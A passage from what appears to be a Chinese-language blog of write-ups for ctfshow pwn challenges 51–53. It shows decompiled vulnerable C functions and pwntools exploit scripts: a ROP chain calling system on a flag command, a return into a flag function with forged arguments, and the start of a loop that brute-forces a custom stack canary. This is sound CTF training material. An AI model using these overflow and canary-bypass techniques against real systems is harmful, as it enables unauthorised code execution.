number\">0x0804aeb5</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>pop_ebp<span class=\"token operator\">=</span><span class=\"token number\">0x080492e4</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>catflag<span class=\"token operator\">=</span><span class=\"token number\">0x804A331</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\">#gdb.attach(p,\"b*0804925A\")</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Who are you?\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">#payload1=b\"I\"*(16)+p32(system_flag)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>payload1<span class=\"token operator\">=</span><span class=\"token string\">b\"I\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>pop_ebp<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>catflag<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"pwn52open函数判断数值相等\"><a class=\"anchor\" href=\"#pwn52open函数判断数值相等\">#</a> pwn52 (open 函数 + 判断数值相等)</h1>\n<h2 id=\"题目-6\"><a class=\"anchor\" href=\"#题目-6\">#</a> 题目</h2>\n<p>题目描述： <code>迎面走来的flag让我如此蠢蠢欲动</code></p>\n<p>32 位程序，保护：</p>\n<pre><code>Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n</code></pre>\n<p>main 函数:</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __cdecl <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdout</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token function\">logo</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>argc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"What do you want?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token function\">ctfshow</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>ctfshow 函数：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">ctfshow</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">char</span> s<span class=\"token punctuation\">[</span><span class=\"token number\">104</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+Ch] [ebp-6Ch] BYREF</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token function\">gets</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>flag 函数：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>__cdecl <span class=\"token function\">flag</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a1<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> a2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>result<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">char</span> s<span class=\"token punctuation\">[</span><span class=\"token number\">64</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+Ch] [ebp-4Ch] BYREF</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  FILE <span class=\"token operator\">*</span>stream<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+4Ch] [ebp-Ch]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  stream <span class=\"token operator\">=</span> <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/ctfshow_flag\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>stream <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/ctfshow_flag: No such file or directory.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  result <span class=\"token operator\">=</span> <span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span> <span class=\"token number\">64</span><span class=\"token punctuation\">,</span> stream<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> a1 <span class=\"token operator\">==</span> <span class=\"token number\">876</span> <span class=\"token operator\">&amp;&amp;</span> a2 <span class=\"token operator\">==</span> <span class=\"token number\">877</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    result <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">printf</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token keyword\">return</span> result<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>可以进行溢出，有个 <code>open('/ctfshow_flag')</code>  但是需要进行绕过使  <code>a1=876&amp;&amp;a2=877</code> ，a1 和 a2 都是 flag 的参数，直接溢出返回到 flag 函数然后附上参数即可</p>\n<p>注意一点如果最后返回的 flag 接收了（recv ()），那么就会导致是字节形式，无法完整看出来 flag，可以利用 str 转化类型</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#context.log_level = 'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'i386'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./pwn51')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#e=ELF('./')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"pwn.challenge.ctf.show\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">28299</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>flag<span class=\"token operator\">=</span><span class=\"token number\">0x8048586</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"What do you want?\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>payload1<span class=\"token operator\">=</span><span class=\"token string\">b\"I\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x6c</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">876</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">877</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#+p32(system)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>a<span class=\"token operator\">=</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">0xa3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"flag:\"</span><span class=\"token operator\">+</span>a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"pwn53\"><a class=\"anchor\" href=\"#pwn53\">#</a> pwn53</h1>\n<h2 id=\"题目-7\"><a class=\"anchor\" href=\"#题目-7\">#</a> 题目</h2>\n<p>题目描述： <code>再多一眼看一眼就会爆炸</code></p>\n<p>32 位程序：</p>\n<pre><code>Arch:     i386-32-little\nRELRO:    Partial RELRO\nStack:    No canary found\nNX:       NX enabled\nPIE:      No PIE (0x8048000)\n</code></pre>\n<p><code>main:</code></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __cdecl <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdout</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token function\">logo</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>argc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token function\">canary</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token function\">ctfshow</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><code>canary:</code></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">canary</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  FILE <span class=\"token operator\">*</span>stream<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+Ch] [ebp-Ch]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  stream <span class=\"token operator\">=</span> <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/canary.txt\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>stream <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/canary.txt: No such file or directory.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token function\">fread</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>global_canary<span class=\"token punctuation\">,</span> <span class=\"token number\">1u</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4u</span><span class=\"token punctuation\">,</span> stream<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span>stream<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><code>ctfshow</code> :</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">ctfshow</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token class-name\">size_t</span> nbytes<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+4h] [ebp-54h] BYREF</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">char</span> v2<span class=\"token punctuation\">[</span><span class=\"token number\">32</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+8h] [ebp-50h] BYREF</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">32</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+28h] [ebp-30h] BYREF</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">int</span> s1<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+48h] [ebp-10h] BYREF</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">int</span> v5<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+4Ch] [ebp-Ch]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  v5 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  s1 <span class=\"token operator\">=</span> global_canary<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"How many bytes do you want to write to the buffer?\\n>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> v5 <span class=\"token operator\">&lt;=</span> <span class=\"token number\">31</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v2<span class=\"token punctuation\">[</span>v5<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v2<span class=\"token punctuation\">[</span>v5<span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">10</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>      <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token operator\">++</span>v5<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token function\">__isoc99_sscanf</span><span class=\"token punctuation\">(</span>v2<span class=\"token punctuation\">,</span> <span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>nbytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"$ \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">,</span> nbytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">memcmp</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>s1<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>global_canary<span class=\"token punctuation\">,</span> <span class=\"token number\">4u</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Error *** Stack Smashing Detected *** : Canary Value Incorrect!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Where is the flag?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">fflush</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdout</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><code>flag:</code></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">flag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">char</span> s<span class=\"token punctuation\">[</span><span class=\"token number\">64</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+Ch] [ebp-4Ch] BYREF</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  FILE <span class=\"token operator\">*</span>stream<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+4Ch] [ebp-Ch]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  stream <span class=\"token operator\">=</span> <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/ctfshow_flag\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>stream <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/ctfshow_flag: No such file or directory.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span> <span class=\"token number\">64</span><span class=\"token punctuation\">,</span> stream<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">fflush</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdout</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这道题有输出 flag 的函数，所以我们只要溢出返回到这里就好了，然后这道题自己构造了一个 canary 文件，然后将这个复制给 s1 存入栈中，必须绕过这个比较才能得到 <code>flag</code> ，而里面是</p>\n<p>因为这个 canary 文件是固定的那么我们可以通过爆破来得出来 canary 的值</p>\n<p>4 个字节的 canary，用的是 memcmp 函数比较，不能用 <code>\\x00</code>  截断，那么就构造循环爆破出 canary</p>\n<h3 id=\"这里的爆破注意\"><a class=\"anchor\" href=\"#这里的爆破注意\">#</a> 这里的爆破注意:</h3>\n<p>尽管是比较 4 个字节，但是当我们只输入一个字节时，没有其他字节可以比较，因此我们可以通过这种方式来爆破第一个字节，第一个字节匹配后没有其他字节可以比较时也会认为是正确的，也就不会退出程序，但是这种我们无法连续输入字符溢出到 ret，因为这样会有其他字节让 <code>memcmp</code>  来进行比较判断，因此我们只能逐个爆破，得到一个正确字节后再进行下一个字节的判断</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#context.log_level = 'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#context(os='linux', arch='i386', log_level='debug')</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>canary<span class=\"token operator\">=</span><span class=\"token string\">b''</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span 